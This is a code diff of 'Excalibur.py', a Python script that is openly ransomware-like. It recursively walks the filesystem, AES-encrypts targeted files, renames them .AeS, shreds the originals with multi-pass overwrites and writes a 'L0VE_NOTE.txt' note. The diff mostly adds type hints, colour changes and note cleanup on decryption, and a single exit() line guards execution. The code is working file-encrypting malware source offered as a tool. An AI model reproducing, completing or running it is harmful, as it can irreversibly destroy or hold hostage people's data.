@@ -2,7 +2,7 @@
 # -=-=-=-=-=-A-=-e-=-S-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- #
 #                                                                          #
 #       Author       -   pyCity                                            #
-#       Date         -   4/25/19                                           #
+#       Date         -   4/27/19                                           #
 #       Version      -   0.1dev                                            #
 #                                                                          #
 #       Usage        -   python3 Excalibur.py -h                           #
@@ -13,7 +13,7 @@
 #                                                                          #
 #                    +   As an importable module:                          #
 #                         - import Excalibur, sys                          #
-#                         - Excalibur.main(sys.argv[1])                    #
+#                         - Excalibur.main(["-e", "-s", "-password"])      #
 #                                                                          #
 # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=A-=-e-=-S-=-=-=-=-=-=- #
 import os
@@ -22,6 +22,7 @@ import argparse
 
 from getpass import getpass
 from time import time
+from typing import Any, Union, Generator
 
 try:
     from concurrent.futures import ThreadPoolExecutor
@@ -128,12 +129,12 @@ class AesExcalibur:
 #                                                                                                    #
 #   pad            - Static method used to pad the supplied key with the AES block size.             #
 #                                                                                                    #
-#   encrypt        - Encrypt takes stream of plaintext message and returns the encrypted message     #
+#   encrypt        - Encrypt reads a stream of plaintext message and returns the encrypted message   #
 #                                                                                                    #
 #   decrypt        - Decrypt an encrypted stream of ciphertext and returns the plaintext             #
 #                                                                                                    #
 #   encrypt_file   - This function tries to read a file in binary mode, then calls encrypt() on      #
-#                    the binary stream. Next it rewrites the original filename as .aes and removes   #
+#                    the binary stream. Next it rewrites the original filename as .AeS and shreds    #
 #                    the original file. If an error occurs, skip to the next file.                   #
 #                                                                                                    #
 #   decrypt_file   - Reverse of encrypt_file                                                         #
@@ -141,26 +142,29 @@ class AesExcalibur:
 #****************************************************************************************************#
  """
 
-    def __init__(self, password):
-        self.key = SHA256.new(password).digest()
+    def __init__(self, password: bytes):
+        """
+
+        :type password: Base64 encoded string to be hashed
+        :param total:   Integer used to count the total number of modified files
+        """
+        self.key = SHA256.new(password).digest()  # Base64 encoded password
         self.total = 0  # Total amount of files modified
 
     def __str__(self):
-        return "Total number of files modified: {}".format(self.total)
+        return Colors.green + "Total number of files modified: {}".format(self.total)
 
     @staticmethod
-    def pad(message):
+    def pad(message: bytes):
         return message + b"\0" * (AES.block_size - len(message) % AES.block_size)
 
-    def encrypt(self, plain_text):
-        """Encrypt a stream of text"""
+    def encrypt(self, plain_text: bytes):
         padded_text = self.pad(plain_text)
         iv = Random.new().read(AES.block_size)
         cipher = AES.new(self.key, AES.MODE_CBC, iv)
         return iv + cipher.encrypt(padded_text)
 
-    def decrypt(self, cipher_text):
-        """Decrypt a stream of text"""
+    def decrypt(self, cipher_text: bytes):
         iv = cipher_text[:AES.block_size]
         cipher = AES.new(self.key, AES.MODE_CBC, iv)
         plaintext = cipher.decrypt(cipher_text[AES.block_size:])
@@ -207,7 +211,7 @@ def parse_args(args):
                         help="Decrypt the entire filesystem", required=False)
 
     parser.add_argument("-s", "--secret", type=str, help="Password to use as key")
-    parser.add_argument("-p", "--passes", type=int, help="Number of passes for shredding file")
+    # parser.add_argument("-p", "--passes", type=int, help="Number of passes for shredding file")
     return parser.parse_args(args)
 
 
@@ -242,8 +246,8 @@ def secure_delete(filename, passes=5):
     """
     Perform a manual 5 pass overwrite using os
 
-    :param passes:    Amount of passes to write garbage to the file
     :param filename:  absolute path of file to delete
+    :param passes:    Amount of passes to write garbage to the file
     """
 
     if not os.path.exists(filename):  # Most secure delete ever
@@ -257,22 +261,26 @@ def secure_delete(filename, passes=5):
 
 
 def serve_payload(mode, password):
-    """Run either encrypt or decrypt in a thread pool
+    """
+    Run either encrypt payload or decrypt payload in a thread pool
 
-    :type password:
-    :type mode:
+    :param mode:      Mode 1 for encryption + notes, mode 2 for decryption - notes
+    :param password:  Password variable to be base64 encoded and hashed with SHA256
     """
 
     start = time()  # Start benchmarking payload time
-    encoded_pass = encodebytes(bytes(password, "utf-8"))  # Base64 encode password for added length before hashing
+    encoded_pass = encodebytes(bytes(password, "utf-8"))
     sanctuary = AesExcalibur(encoded_pass)  # Initialize encryption object in memory (Also encrypts key)
-    files = recursive_walk(paths, target_extensions, mode)  # Create a generator object with targeted files as iterables
 
-    with ThreadPoolExecutor(max_workers=25) as pool:  # Serve payload in with max 25 threads in the thread pool
+    files: Generator[Union[bytes, str], Any, Any] = recursive_walk(paths, target_extensions, mode)
+
+    # Serve payload in with max 25 threads in the thread pool (experiment with this number with high IO)
+    with ThreadPoolExecutor(max_workers=25) as pool:
+
         if mode is 1:
-            print(Colors.white + "Encrypting system")
+            print(Colors.blue + "Encrypting system")
             pool.map(sanctuary.encrypt_file, tqdm(files, unit=" file", miniters=int(223265/100),
-                                                  ascii=True, desc="Encryption status"))  # Begin applying encryption
+                                                  ascii=True, desc="Encryption status"))
 
             try:
                 for path in paths:
@@ -281,19 +289,23 @@ def serve_payload(mode, password):
             except: pass
 
         elif mode is 2:  # Begin applying decryption
-            print(Colors.white + "Decrypting system")
+            print(Colors.green + "Decrypting system")
             pool.map(sanctuary.decrypt_file, tqdm(files, unit=" file", miniters=int(223265/100),
                                                   ascii=True, desc="Decryption status: "))
+            try:
+                for path in paths:
+                    with open(path + "/L0VE_NOTE.txt", "w+") as f:
+                        secure_delete(f)
+            except: pass
 
     # Print total
-    print(Colors.green + sanctuary.__str__())
-    print(Colors.green + "Total runtime: {}\n".format(time() - start))
+    print(Colors.blue + sanctuary.__str__())
+    print(Colors.blue + "Total runtime: {}\n".format(time() - start))
 
     # # Encrypt this file
     answer = input("Encrypt this file? [y/n]")
     if answer in ["y", "Y", "yes", "YES"]:
         sanctuary.encrypt_file(os.path.abspath(__file__))
-        # sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))
     else:
         sys.exit(0)
 
@@ -306,6 +318,7 @@ def main(args=None):
     Print beautiful artwork
     Ward away the skids with the almighty exit()
     """
+
     os.system("clear" if "linux" in sys.platform else "cls")
     exit("THIS WILL HARM YOUR COMPUTER")
     print(Colors.blue + ascii_art)
@@ -313,7 +326,7 @@ def main(args=None):
     # If user entered any arguments, run them through parse_args()
     if args:
         args = parse_args(args)
-        print(Colors.white + "Arguments entered: {}".format(args))
+        print(Colors.purple + "Arguments entered: {}".format(args))
 
     # User didn't enter any args. Get input manually
     if not args:
@@ -329,22 +342,22 @@ def main(args=None):
         else:
             exit(Colors.red + "Invalid input")
 
-    # User chose encrypt system
+    # User chose to encrypt system
     elif args.encrypt:
 
         # User entered some args but didn't enter a password variable
         if not args.secret:
-            password = getpass(Colors.bold + "Enter a password for the encryption key: ")
+            password = getpass(Colors.white + "Enter a password for the encryption key: ")
             serve_payload(mode=1, password=password)
         else:
             serve_payload(mode=1, password=args.secret)
 
-    # User chose decrypt system
+    # User chose to decrypt system
     elif args.decrypt:
 
         # User entered some args but didn't enter a password variable
         if not args.secret:
-            password = getpass(Colors.bold + "Enter a password for the encryption key: ")
+            password = getpass(Colors.white + "Enter a password for the encryption key: ")
             serve_payload(mode=2, password=password)
         else:
             serve_payload(mode=2, password=args.secret)
